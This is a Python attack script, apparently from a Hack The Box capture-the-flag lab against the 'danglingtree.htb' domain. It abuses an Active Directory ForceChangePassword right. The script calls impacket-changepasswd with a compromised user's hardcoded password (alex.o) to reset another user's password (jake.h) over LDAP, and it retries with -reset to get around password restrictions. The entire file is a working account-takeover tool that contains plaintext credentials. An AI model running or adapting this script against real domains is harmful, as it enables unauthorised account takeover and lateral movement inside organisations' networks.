#!/usr/bin/env python3
"""ForceChangePassword: alex.o → jake.h (support-it has FCP on Helpdesk path).

Uses impacket-changepasswd LDAP reset (Samba-style password set, bypasses
PASSWORD_RESTRICTION on normal change when -reset works).

Usage:
  python3 fcp_jake.py
  python3 fcp_jake.py --newpass 'YourNewPass#2026!'
"""
from __future__ import annotations

import argparse
import os
import subprocess
import sys

DC = os.environ.get("DC_IP", "10.129.6.118")
DOMAIN = os.environ.get("DOMAIN", "danglingtree.htb")
ALEX_USER = "alex.o"
ALEX_PASS = os.environ.get("ALEX_PASS", "SunsetMountainPeak@2025")
JAKE_USER = "jake.h"
DEFAULT_JAKE_PASS = "Zz9!Qk7#Mm2$Xx4@Ww5%Ll2026Dan"


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--dc-ip", default=DC)
    ap.add_argument("--newpass", default=DEFAULT_JAKE_PASS)
    ap.add_argument("--alex-pass", default=ALEX_PASS)
    args = ap.parse_args()

    # impacket-changepasswd 'domain/user@ip' -newpass X -altuser alex -altpass Y -reset -protocol ldap
    target = f"{DOMAIN}/{JAKE_USER}@{args.dc_ip}"
    cmd = [
        "impacket-changepasswd",
        target,
        "-newpass",
        args.newpass,
        "-altuser",
        ALEX_USER,
        "-altpass",
        args.alex_pass,
        "-reset",
        "-protocol",
        "ldap",
    ]
    print("[*] ", " ".join(cmd[:3]), "... -reset -protocol ldap")
    r = subprocess.run(cmd, capture_output=True, text=True)
    print(r.stdout)
    print(r.stderr, file=sys.stderr)
    if r.returncode == 0 or "success" in (r.stdout + r.stderr).lower():
        print(f"[+] jake.h password set to: {args.newpass}")
        return 0
    print("[-] FCP may have failed — check output (PASSWORD_RESTRICTION → retry -reset)")
    return r.returncode or 1


if __name__ == "__main__":
    sys.exit(main())
